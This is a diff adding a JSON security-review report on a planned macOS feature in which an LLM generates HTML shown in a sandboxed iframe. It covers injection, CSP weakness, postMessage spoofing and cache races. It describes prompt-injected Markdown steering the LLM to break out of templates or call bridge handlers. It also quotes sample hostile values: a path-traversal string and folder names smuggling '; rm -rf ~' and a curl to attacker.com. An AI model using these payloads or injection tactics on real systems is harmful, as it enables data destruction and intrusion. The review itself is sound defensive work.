@@ -1,0 +1,181 @@
+{
+  "status": "changes_required",
+  "summary": {
+    "totalFindings": 17,
+    "critical": 4,
+    "major": 8,
+    "minor": 5
+  },
+  "findings": [
+    {
+      "severity": "critical",
+      "category": "A03: Injection",
+      "title": "Skeleton fields interpolated into iframe srcdoc without mandated HTML-escaping",
+      "description": "Phase 1 produces an InsightSkeleton (title, section.title, deepDiveTopics[].label, etc.) that the parent JS interpolates into an iframe srcdoc string. All of these fields originate from the LLM and are LLM/prompt-injectable. The tech-spec describes `bridge.loadInsightSkeleton(skeleton:into:)` building the iframe srcdoc from skeleton, but never explicitly mandates HTML-escaping of skeleton string fields when assembling srcdoc. If a title contains `</script>` or `\"><script>...`, the LLM can break out of the parent's srcdoc-construction template and inject content that, while still confined by the sandbox, can corrupt the chrome rendering rules, manipulate the postMessage protocol from inside, or bypass the parent's intended iframe layout. Because srcdoc is built parent-side, a srcdoc-template breakout potentially executes BEFORE the sandbox is fully effective for the surrounding parent-controlled HTML. Acceptance criteria do not include 'all skeleton fields HTML-escaped before srcdoc interpolation'.",
+      "location": "Section: Architecture > How it works > Phase 1 step 4 ('builds iframe srcdoc containing: CSP meta + libs blob URLs + skeleton-derived placeholders'); Decision 2; Task 5",
+      "impact": "Prompt-injected .md content can craft skeleton fields that escape the parent's srcdoc template, potentially injecting malicious HTML into the iframe chrome region (breadcrumb HTML inside iframe), interfering with the postMessage allowlist enforcement code that lives inside parent-controlled portions of srcdoc, or trivially defeating placeholder/loader UI in confusing ways. Combined with `script-src 'unsafe-inline'`, a srcdoc-template breakout becomes near-arbitrary script execution inside the sandbox (which is what the sandbox is supposed to contain — but only if construction itself is intact).",
+      "recommendation": "Add to acceptance criteria: 'All InsightSkeleton string fields (title, section.title, deepDiveTopics[].label, deepDiveTopics[].hint, suggestedTheme) are HTML-escaped via a single allowlist sanitizer before being interpolated into iframe srcdoc OR are emitted only via JSON.stringify into a `<script type=\"application/json\">` block and consumed via textContent reads at runtime.' Mandate that NO skeleton field is concatenated as raw HTML during srcdoc construction. Add Task 5 verification step: grep for `+` string concatenation involving `skeleton.` in the JS that builds srcdoc → flag every site for review.",
+      "cwe": "CWE-79"
+    },
+    {
+      "severity": "critical",
+      "category": "A04: Insecure Design",
+      "title": "CSP script-src includes 'unsafe-inline' AND blob: — sandbox is the ONLY exfil/abuse boundary",
+      "description": "The CSP for the iframe srcdoc is `script-src 'self' 'unsafe-inline' blob:` (Risk row + Acceptance Criteria 'iframe sandbox security'). With sandbox=allow-scripts (no allow-same-origin), `'self'` resolves to a null/opaque origin so it is functionally meaningless. `'unsafe-inline'` allows every LLM-injected `<script>` block to run. `blob:` allows the iframe to do `URL.createObjectURL(new Blob([js], {type:'text/javascript'}))` and inject any JS it wants via dynamic <script src='blob:...'>. Together these mean CSP provides essentially zero script-execution restriction inside the iframe — the entire defense is `connect-src 'none'` (blocks fetch/XHR/WS/EventSource/SSE/beacon) plus the sandbox null-origin (blocks DOM/cookies/localStorage/messageHandlers access to parent). Spec correctly identifies this in Decision 2 but the layered model is fragile: any CSP byass technique, navigation-based exfil (window.open / form.submit blocked by sandbox — confirm allow-popups and allow-forms are absent in srcdoc CSP `frame-src`/`form-action` too), or future browser leniency in null-origin frames collapses defense to zero. ",
+      "location": "Section: Risks ('CSP within iframe srcdoc: connect-src 'none'; script-src 'self' 'unsafe-inline' blob:'); Acceptance Criteria > Iframe sandbox security",
+      "impact": "If WebKit ever loosens null-origin frame restrictions, OR if a CSP bypass is found (historical: dangling markup, base tag injection — base-uri 'none' helps), OR if connect-src is misparsed by a future engine, LLM-injected JS gets full execution with no restriction (exfil, fingerprinting, infinite tab spam). Defense-in-depth violated: a single boundary failure = total compromise.",
+      "recommendation": "(1) Drop `blob:` from script-src — libs are loaded via parent-injected blob URLs into srcdoc as `<script src='blob:...'>` BEFORE sandbox script-src kicks in for new dynamic loads, OR move libs to inline <script> with their content directly embedded (Decision 5 alternative was rejected for size; reconsider for security). Actually: blob: is needed because libs ARE loaded via blob URLs at runtime — leaving blob: in is required. Document this trade-off explicitly. (2) Add `form-action 'none'`, `frame-src 'none'`, `worker-src 'none'`, `child-src 'none'`, `manifest-src 'none'`, `media-src 'none'` to the CSP to close all other request types (sandbox blocks most but defense-in-depth). (3) Consider strict-dynamic + nonce for parent-injected library scripts so LLM <script> blocks without the nonce don't execute — this would actually contain LLM script execution while allowing your bundled libs. This is a significant architectural strengthening.",
+      "cwe": "CWE-1021"
+    },
+    {
+      "severity": "critical",
+      "category": "A01: Broken Access Control",
+      "title": "insightBreadcrumbClicked nodeId not validated against session manifest before disk read",
+      "description": "The flow `iframe → postMessage{type:'insightBreadcrumbClicked', payload:{nodeId}} → parent → bridge → WorkspaceManager.didRequestInsightBreadcrumb → session.navigateTo(nodeId:) → cache.readNode(nodeId:)` reads `<sessionUUID>/nodes/<nodeUUID>.html`. The spec mentions topicIndex bounds-check for deep-dive but DOES NOT explicitly require validating nodeId against the session's manifest before reading. If nodeId is taken at face value, a compromised iframe (e.g., via prompt injection that bypasses sandbox + frameInfo guard) could trigger reads of arbitrary UUID-formatted file paths within the cache directory. More concerning: if the parent doesn't validate UUID format, path-traversal-like values (`../../../etc/passwd`) could be passed — though Swift URL handling and the `%@.html` suffix limit this, defense-in-depth is missing.",
+      "location": "Section: Architecture > How it works > Navigation > 'session.navigateTo: try cache.readNode(nodeId:)'; Acceptance Criteria > Disk cache",
+      "impact": "An iframe that finds a postMessage protocol bypass can cause the parent to read arbitrary files within the cache root. If cache root path validation is weak (e.g., URL constructed via string interpolation), broader filesystem read possible. Also enables IDOR-style cross-session reads if all session caches are siblings (`.insight-cache/<sessionA>/`, `.insight-cache/<sessionB>/`) and nodeId is the only key — though session.cache is bound to one sessionUUID, so cross-session is mitigated by the cache instance scoping IF cache.readNode never accepts a path overlay.",
+      "recommendation": "Add hard requirement and acceptance criterion: (a) parent-side, before forwarding `insightBreadcrumbClicked` to Swift, validate `payload.nodeId` matches `^[0-9a-fA-F-]{36}$` UUID regex AND exists in the current session's loaded manifest in-memory; (b) Swift-side `cache.readNode(nodeId: UUID)` must take a `UUID` type (not String), construct path via `URL.appendingPathComponent`, then `resolvingSymlinksInPath().standardizedFileURL` and verify containment in `nodesDirectory` (per Decision 10 §6 v1 pattern referenced in Task 3). Add equivalent validation for `insightDeepDiveClicked.sectionId` against current skeleton's section IDs.",
+      "cwe": "CWE-639"
+    },
+    {
+      "severity": "critical",
+      "category": "A03: Injection",
+      "title": "Parent does not unconditionally strip LLM-emitted <script src=https://...> from section content before forwarding to iframe",
+      "description": "Acceptance Criteria includes: 'No CDN URLs (https://cdn.jsdelivr.net, https://cdnjs.cloudflare.com, etc.) appear in any LLM-generated content' AND 'If grep shows CDN URL in LLM output: parent strips and replaces with blob URL (or rejects section as malformed)'. This is phrased as a verification step, NOT as a runtime enforcement requirement in `bridge.updateInsightSection`. The architecture relies on (a) sandbox blocking the fetch and (b) CSP `connect-src 'none'` blocking the request. But `<script src=https://...>` is governed by `script-src`, NOT `connect-src` — and `script-src` is `'self' 'unsafe-inline' blob:` which DOES NOT include `https:` so an https script load is blocked at CSP level. So CSP does block this. However: (1) the spec does not mandate runtime stripping — only post-hoc grep verification by QA, which can miss live attacks; (2) attempted loads still trigger DNS lookups (SafariViewService prefetch / favicon etc.) — minor info leak; (3) other tags like `<link rel=preload as=script href=https://...>`, `<iframe src=https://...>` (sandbox-allowed iframes can have nested iframes if the parent iframe has allow-scripts? Actually no — sandboxed frames inherit sandbox), `<object data=https://...>` may behave differently across CSP directives.",
+      "location": "Section: Acceptance Criteria > Pre-bundled libs ('No CDN URLs ... appear in any LLM-generated content'); Risks row 'LLM-generated section HTML embeds <script>'",
+      "impact": "(1) Without runtime enforcement, regression in Mermaid CSP behavior or future model behavior could produce successful CDN loads. (2) DNS prefetch from blocked-load attempts leaks the user's IP and the target hostname — a covert channel for prompt-injection exfil even with CSP blocking the actual fetch. (3) Inconsistency between 'blocks at sandbox layer' and 'blocks at CSP layer' makes audit harder.",
+      "recommendation": "Mandate at runtime in `bridge.updateInsightSection` (parent-side, before `iframe.contentWindow.postMessage`): regex-strip every `https?:` URL from `htmlChunk` (replace with `blob:` placeholder or empty). Also strip `<script ... src=>` tags entirely (only inline scripts inside libs blob URLs should reach iframe). Add CSP `prefetch-src 'none'` (deprecated but some browsers still respect) to mitigate DNS leak. Add acceptance criterion: 'parent-side `updateInsightSection` strips all https:/http: URL references from LLM-emitted htmlChunk before forwarding'.",
+      "cwe": "CWE-79"
+    },
+    {
+      "severity": "major",
+      "category": "A05: Security Misconfiguration",
+      "title": "postMessage receiver lacks event.source / event.origin verification",
+      "description": "The spec describes 'parent listens, validates payload, sends to Swift via webkit.messageHandlers'. It does NOT mandate that the parent's window message listener verifies `event.source === iframe.contentWindow` or `event.origin === 'null'` (the expected origin of the sandboxed iframe). Without source/origin verification, any other JS context that can post to the parent window — browser extensions, devtools console, any future co-loaded frame — can post matching-shape messages and trigger Swift bridge calls (deep-dive, save, breadcrumb, requestUp).",
+      "location": "Section: Architecture > How it works > Navigation; Decision 2; Acceptance Criteria > Iframe sandbox security",
+      "impact": "Browser extensions installed in WKWebView (limited but possible via WKWebView extensions API on macOS 14+) or future evolutions of the parent page could spoof iframe messages, triggering arbitrary save-archive operations, navigateTo to any nodeId, or DoS via flooding deep-dive expansions. Defense-in-depth gap.",
+      "recommendation": "Add acceptance criterion: 'parent message listener validates event.source === insightIframeReference AND event.origin === \"null\" (sandboxed iframe origin) before any payload validation or forwarding'. Reject messages that fail either check silently (do not log payload — log-injection vector via attacker-controlled message content).",
+      "cwe": "CWE-345"
+    },
+    {
+      "severity": "major",
+      "category": "A04: Insecure Design",
+      "title": "cache.cleanup() in closeTab races with in-flight Phase 2 writes",
+      "description": "WorkspaceManager.closeTab insight branch ordering: `session.cancel()` → `try? session.cache.cleanup()` → `tabsStore.removeTab`. `session.cancel()` cancels Tasks cooperatively; in-flight `streamCompletion` callbacks observe cancellation only at next chunk. Between cancel issuance and observed cancellation, a Phase 2 task may still be executing `cache.writeNode(nodeId:, html:)` (atomic temp-file + rename). The cleanup() call deletes the entire session directory; if it runs while a writeNode is mid-rename, the rename may succeed into a now-deleted directory (creates orphan), or fail and surface as `try?`-swallowed error. Worst case: a writeNode creates the directory back (if writeNode does `createDirectory(withIntermediateDirectories:true)`), leaving a stale half-cache that 'next session start ignores' but never garbage-collects.",
+      "location": "Section: Architecture > How it works > Tab close; Risks row 'Tab close while phases in flight'; Decision 4",
+      "impact": "(1) Stale orphan directories accumulate over time (disk waste, low-severity privacy leak — leaks LLM-generated content past intended session lifetime). (2) Race may corrupt manifest.json (cleanup deletes, write recreates partial). (3) Errors swallowed via `try?` mask the issue from operator visibility — A09 logging gap.",
+      "recommendation": "(1) Make `session.cancel()` await all in-flight section task writes before returning (use a `withTaskGroup` join or explicit `await session.activeWriteTasks.allSettled`). (2) `cache.cleanup()` should call `cache.writesQuiesced()` first (or take the same actor lock that writeNode uses). (3) Don't use `try?` — log cleanup failures at WARN with sanitized path. (4) Add a startup GC: at app launch, scan `.insight-cache/` for directories whose sessionUUID is not in any active workspace session and remove them.",
+      "cwe": "CWE-362"
+    },
+    {
+      "severity": "major",
+      "category": "A04: Insecure Design",
+      "title": "Defense-in-depth assumption (frameInfo.isMainFrame) unverified — single-layer security in worst case",
+      "description": "Decision 3 explicitly notes: 'user opted out of a spike to verify WebKit's exact behavior. We therefore assume the standard semantic (sandbox isolates from webkit.messageHandlers) AND add a defensive Swift-side check.' If the assumption is wrong AND a sandboxed null-origin frame can reach `webkit.messageHandlers.bridge` directly (rather than only via parent-postMessage relay), the frameInfo guard rejects but the LEGITIMATE flow may break too — because the legitimate postMessage relay travels parent → Swift, frameInfo is mainFrame for legitimate calls. So the guard works ONLY IF illegitimate iframe→Swift calls have frameInfo.isMainFrame == false. This is the correct WebKit behavior IF the iframe can post to messageHandlers at all. There's no test, no spike, and tests are deferred per Decision 9. The mitigation 'manual smoke during QA: poison a .md file → run insight → check no spurious bridge calls reach Swift' is a single-sample test, not a guarantee.",
+      "location": "Section: Decisions > Decision 3; Risks row 'WKWebView iframe sandbox may auto-inject webkit.messageHandlers'",
+      "impact": "If the assumption is incorrect, prompt-injected LLM HTML can call `webkit.messageHandlers.bridge.postMessage({type:'insightRequestSave', ...})` directly with arbitrary payload, triggering ZIP export to user's filesystem with attacker-influenced staging content, OR trigger any other bridge handler. With sandbox OFF for parent and Process spawning, this could escalate to arbitrary code via crafted ZIP export staging content (though /usr/bin/zip itself is not RCE-prone).",
+      "recommendation": "Add a non-deferrable verification task BEFORE merge: write a minimal unit/integration probe (even without XCTest target — a one-off Swift script harness or a manual verification with logged frameInfo dump) that confirms (a) sandboxed iframe cannot directly call webkit.messageHandlers, OR (b) if it can, the frameInfo.isMainFrame is false in those calls. Document the verification result in decisions.md. As a stronger architectural fix, consider WKContentWorld isolation or removing the messageHandler from the iframe's content world entirely (WKUserContentController.add(_:contentWorld:name:) with a non-default world that the iframe cannot access).",
+      "cwe": "CWE-693"
+    },
+    {
+      "severity": "major",
+      "category": "A03: Injection",
+      "title": "ZIP export Process invocation pattern not specified — argument-array vs shell ambiguity",
+      "description": "Decision 7 says `/usr/bin/zip -r <destination> .` is spawned via Foundation Process. The default destination filename includes `<folderName>` from filesystem, which can contain spaces, quotes, and special characters. The destination path comes from NSSavePanel (user-controlled, less risk but still arbitrary). The spec does not explicitly mandate that Process is configured with `arguments: [String]` (safe — direct execve, no shell) versus `Process(launchPath: '/bin/sh', arguments: ['-c', '/usr/bin/zip ...'])` (unsafe — shell-interpreted). Existing pattern reference is `GitClient.swift L193-209` which presumably uses argument-array form, but the v2 spec doesn't reaffirm.",
+      "location": "Section: Decisions > Decision 7; Architecture > How it works > Save / Export; Task 8",
+      "impact": "If Process is invoked through `/bin/sh -c '...'` with string-interpolated paths, a folder name containing `; rm -rf ~` or `\\$(curl attacker.com)` becomes shell injection. With sandbox OFF, this is RCE on user's account.",
+      "recommendation": "Add hard acceptance criterion: 'InsightArchiveExporter.bundle uses Process with executableURL = /usr/bin/zip and arguments = [\"-r\", destinationTmpURL.path, \".\"], NEVER /bin/sh -c. currentDirectoryURL = stagingURL. No string concatenation of paths into a shell command.' Add explicit code-reviewer checklist item.",
+      "cwe": "CWE-78"
+    },
+    {
+      "severity": "major",
+      "category": "A09: Security Logging and Monitoring",
+      "title": "No audit trail for security-relevant events",
+      "description": "The spec mentions logging only for: (a) schema fallback warning, (b) `try?` cleanup errors swallowed silently, (c) ZIP export error via NSAlert. It does NOT specify logging for: rejected postMessage types (out-of-allowlist), failed frameInfo.isMainFrame checks, malformed payloads, out-of-range topicIndex rejections, oversized HTML rejections (per-node 2MB cap), schema validation failures (only fallback success logged), cleanup failures, blob URL exhaustion. Without an audit trail, prompt-injection attempts and successful sandbox-escape probes go unnoticed — operator (the user) has no signal that something is wrong.",
+      "location": "Section: Architecture > How it works (multiple validation steps with no log mention); Acceptance Criteria",
+      "impact": "Active attacks via poisoned .md files succeed silently. The user cannot tell that a deep-dive expansion was rejected for being out-of-bounds (could be benign LLM error or could be active probe). Compliance/forensics impossible.",
+      "recommendation": "Add to acceptance criteria: 'every security-relevant rejection (postMessage type not in allowlist, payload schema mismatch, frameInfo guard hit, topicIndex out of range, sectionId not in current skeleton, HTML over 2MB cap, schema validation requiring fallback, write/cleanup error) emits a structured log entry to NSLog with category=security, level=warning, context=sanitized via existing sanitize() helper. No raw payload bodies (log-injection prevention).'",
+      "cwe": "CWE-778"
+    },
+    {
+      "severity": "major",
+      "category": "A05: Security Misconfiguration",
+      "title": "Iframe load timeout mentioned in risks but not in acceptance criteria",
+      "description": "Risks row 'LLM-generated HTML triggers infinite loop / spam alerts' mentions 'Iframe load timeout (10s) → if insightIframeReady not received, parent shows iframe failed to load error'. This is ABSENT from Acceptance Criteria, ABSENT from Implementation Tasks, and the value (10s) not justified. Without a load timeout, an LLM-emitted infinite loop in iframe top-level script means the iframe never posts insightIframeReady, the parent waits forever, status bar stuck at 'iframe loading...', user perceives hang.",
+      "location": "Section: Risks; missing from Acceptance Criteria and Tasks",
+      "impact": "DoS via prompt injection: a poisoned .md leads to LLM emitting `<script>while(1){}</script>` — iframe consumes one CPU core indefinitely, parent UI thread is fine but user's machine slows. No automatic recovery.",
+      "recommendation": "Add to Task 5 acceptance criteria: 'parent starts a 10s timer when injecting iframe srcdoc; if insightIframeReady not received before timer fires, parent invokes setInsightError(message: \"iframe failed to load — content may be malformed\", retryable: true), discards iframe (sets srcdoc=\"\"), and offers retry. Timer cancelled on receipt of insightIframeReady.' Also add per-section 30s streaming timeout for Phase 2.",
+      "cwe": "CWE-400"
+    },
+    {
+      "severity": "major",
+      "category": "A02: Cryptographic Failures",
+      "title": "Vendored libs SHA-256 verified at vendor time only, not at runtime",
+      "description": "Decision 5 / Task 2: 'Compute SHA-256, record in new MarkView/Resources/Editor/vendor/MANIFEST.txt'. Verification step in AVP runs `shasum -a 256` at QA time. There is no runtime verification — at app launch or session start, the app loads vendor/js/chart-4.4.x.min.js bytes, makes a blob URL, and serves to iframe with no integrity check. If the app bundle is modified post-install (gatekeeper bypass, supply-chain tampering of the .app, malicious update), tampered libs are silently served to iframes — and these libs run with the same CSP relaxations as legitimate libs (script-src 'unsafe-inline' blob:, plus full DOM access to LLM-generated content within the sandbox).",
+      "location": "Section: Decisions > Decision 5; Task 2; AVP verification step 'Chart.js vendored + verified'",
+      "impact": "Supply-chain attack on the macOS bundle (less common but real for unsigned/notarized builds, or .app modifications) bypasses lib integrity. Tampered Chart.js could exfil rendered chart data, modify LLM-generated content interpretation, etc.",
+      "recommendation": "(1) At session start, before creating blob URLs, the parent computes SHA-256 of each loaded lib's bytes and compares against MANIFEST.txt. On mismatch, refuse to start the session and surface a security-grade error. (2) Add code-signing requirement for the .app bundle (already standard for distribution, but document in security model). (3) Consider Subresource Integrity (SRI) via `<script integrity=\"sha256-...\" src=\"blob:...\">` — confirm WebKit's SRI handling for blob: URLs.",
+      "cwe": "CWE-353"
+    },
+    {
+      "severity": "major",
+      "category": "A04: Insecure Design",
+      "title": "Blob URL revocation not in acceptance criteria — memory leak surface",
+      "description": "Decision 5 mentions 'blob URL lifecycle (creation, revocation on session close)' as a follow-up task scope item. There is NO acceptance criterion that verifies blob URLs created via `URL.createObjectURL` are revoked via `URL.revokeObjectURL` on session close, on iframe srcdoc reset (navigation), or on session.cancel(). Each unrevoked blob URL pins ~1MB of lib memory until the parent page is destroyed (which only happens on app quit).",
+      "location": "Section: Decisions > Decision 9 ('blob URL lifecycle ... follow-up'); missing from Acceptance Criteria",
+      "impact": "(1) Memory leak: 50 nodes × 4 libs × 1MB = 200MB pinned per session if recreated per node (unclear if libs are reused across nodes within a session — spec says 'created once per parent page load'). Across many sessions opened/closed in one app run: linear memory growth. (2) Lower-severity attack vector: blob URLs persist after session close, theoretically referenceable from unrelated WKWebView contexts (very narrow but non-zero).",
+      "recommendation": "Add acceptance criterion: 'parent JS maintains a Set of created blob URLs per session; on session close (closeTab), iframe srcdoc reset (navigateTo), or session.cancel(), all blob URLs in the set are revoked via URL.revokeObjectURL and the Set cleared.' Add Instruments leak check assertion in Task 12 Pre-deploy QA.",
+      "cwe": "CWE-401"
+    },
+    {
+      "severity": "major",
+      "category": "A06: Vulnerable and Outdated Components",
+      "title": "No CVE/dependency-vulnerability check process defined for vendored libs",
+      "description": "Decision 5 and Task 2 vendor Chart.js 4.4.x and reference existing Mermaid/KaTeX/Prism. The spec records SHA-256 in MANIFEST.txt for integrity but specifies NO process for checking known CVEs in these versions or for periodic re-checks. Mermaid in particular has had several XSS-class CVEs historically (CVE-2024-x range), and KaTeX has had parser CVEs. Without a re-check cadence and a documented version-pinned source-of-truth date, libs go stale.",
+      "location": "Section: Decisions > Decision 5; Task 2; Risks (no row mentions component CVE risk)",
+      "impact": "Known-vulnerable lib version ships in app bundle for months/years. Lib XSS in Mermaid (e.g., diagram source crafted to break parser) → arbitrary script in iframe, which is sandbox-confined but still serves as a stepping stone for chained attacks (e.g., DOM-clobbering of postMessage listener inside iframe).",
+      "recommendation": "(1) Add to MANIFEST.txt: source URL, version, vendor date, and a 'last CVE check' date with reviewer initials. (2) Establish a quarterly re-check task (could be a tasks/todo.md follow-up). (3) Snyk/npm audit equivalent: even though these are vendored .min.js files, run them through `npm audit` by adding them to a thin package.json devDependency or by manually checking the GitHub advisory DB. (4) Document upgrade policy: 'patch versions auto-upgraded on next vendor; minor/major require security review'.",
+      "cwe": "CWE-1104"
+    },
+    {
+      "severity": "minor",
+      "category": "A09: Security Logging and Monitoring",
+      "title": "Stale cache directories from prior crashes never garbage-collected",
+      "description": "Risks row 'Stale cache from previous app crash' acknowledges 'Manual cleanup via `find ~/.../.insight-cache -mtime +7 -delete` if user wants. Documented in known-issues.' This places GC burden on the user. Over time, with many crashes or aborted sessions, `.insight-cache/` accumulates content that contains LLM-generated material derived from user's .md files — a long-tail privacy leak.",
+      "location": "Section: Risks > 'Stale cache from previous app crash'",
+      "impact": "Privacy: months-old generated insight content remains on disk past its intended lifetime. Disk: unbounded growth.",
+      "recommendation": "Add an automatic GC at app launch: enumerate `.insight-cache/<sessionUUID>/`, for each directory whose last-modified time is older than N days (e.g., 7) AND whose sessionUUID is not currently in use, delete it. Log aggregate freed bytes at WARN level. No new task needed — bolt onto WorkspaceManager.startup or InsightCache static helper.",
+      "cwe": "CWE-459"
+    },
+    {
+      "severity": "minor",
+      "category": "A08: Software and Data Integrity Failures",
+      "title": "Manifest.json titles render in exported ZIP via separate code path — escaping discipline must propagate",
+      "description": "InsightManifest.NodeManifestEntry.title comes from skeleton (LLM). When written to manifest.json via Codable, JSON-encoding escapes are applied (safe at write-time). When read back: in-app chrome uses textContent (per spec). In the EXPORTED ZIP, however, `index.html` (root, deep-dive onclicks rewritten) is built by `cache.archiveStagingDirectory()` — this is a SEPARATE rendering path from the runtime iframe srcdoc. The spec does not explicitly say that the ZIP-exported HTML applies the same HTML-escaping discipline to titles, breadcrumb labels, deep-dive labels.",
+      "location": "Section: Architecture > How it works > Save / Export; Decision 7",
+      "impact": "Exported ZIP, opened in user's browser (or shared with other users), executes LLM-injected scripts in the user's main browser context with full origin (file://) — far more dangerous than the in-app sandbox. A poisoned .md → exported insight → opened in Safari → LLM XSS executes with file:// privileges (browser-dependent: file:// is mostly isolated but historically has had cross-file read CVEs).",
+      "recommendation": "Add acceptance criterion to Task 8: 'Exported staging-dir HTML files (index.html, nodes/<uuid>.html) are constructed by the SAME rendering function as runtime iframe srcdoc, with the SAME HTML-escaping discipline applied to all LLM-derived strings (title, section title, deep-dive label). Same CSP meta tag included in exported HTML.' Optionally add `<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; script-src 'self'; ...\">` to exported HTML to limit damage if escaping has a gap.",
+      "cwe": "CWE-79"
+    },
+    {
+      "severity": "minor",
+      "category": "best-practice",
+      "title": "API key sanitization in errors / NSLog not explicitly verified for new toolCall path",
+      "description": "Decision 8 says toolCall 'Reuses existing apiKey, headers, error sanitize.' Acceptance criteria do not include an explicit grep/audit step that verifies AIProviderError sanitization is applied to all error paths emanating from the new toolCall method (HTTP error bodies, JSON parse errors, schema validation errors), nor that NSLog calls in the toolCall path strip Authorization/x-api-key headers.",
+      "location": "Section: Decisions > Decision 8; Task 1",
+      "impact": "If toolCall has a code path that throws with the raw URLRequest or response body (which includes the x-api-key header on request errors), the API key may leak into NSLog → Console.app → potentially screen-share / log-aggregator capture.",
+      "recommendation": "Add Task 1 acceptance criterion: 'All error paths in toolCall route through AIProviderError + existing sanitize() helper; no NSLog in toolCall path emits headers, request bodies, or response bodies without sanitization. Verified by grep for NSLog/print/os_log in modified AIProviderClient.swift.'",
+      "cwe": "CWE-532"
+    },
+    {
+      "severity": "minor",
+      "category": "best-practice",
+      "title": "Per-section streaming timeout absent — slow Anthropic response can hang sections indefinitely",
+      "description": "v1 inherited resource caps include per-SSE-line 64KB and per-event 1MB, but no overall timeout on a streamCompletion call. With Phase 2 launching N parallel section streams, one stuck section (rate limited but not 429'd, just slow) can hang in `.streaming` status forever. UI shows 'X/N sections' progress bar stuck. No automatic abort.",
+      "location": "Section: Acceptance Criteria > Resource caps; Risks (no row addresses slow-stream hang)",
+      "impact": "Indefinite UI stall on one section; user must close tab. Not a security issue per se but DoS-class robustness gap; impacts the security goal of 'no LLM-driven hang state'.",
+      "recommendation": "Add acceptance criterion: 'Each Phase 2 section task has a 60s wall-clock timeout from first chunk OR 120s total from task start. On timeout, section enters .failed status with retry available; other sections unaffected.'",
+      "cwe": "CWE-400"
+    }
+  ]
+}
